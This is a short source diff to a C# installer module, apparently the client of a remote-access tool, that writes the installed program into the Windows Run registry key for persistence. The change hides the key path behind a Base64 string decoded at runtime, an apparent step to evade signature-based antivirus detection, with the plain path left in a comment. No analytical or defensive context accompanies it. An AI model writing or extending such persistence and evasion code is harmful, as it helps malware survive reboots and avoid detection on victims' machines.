@@ -41,7 +41,7 @@ namespace Client.Install
                     }
                     else
                     {
-                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", RegistryKeyPermissionCheck.ReadWriteSubTree))
+                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(System.Text.Encoding.Default.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree))//"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
                         {
                             key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
                         }
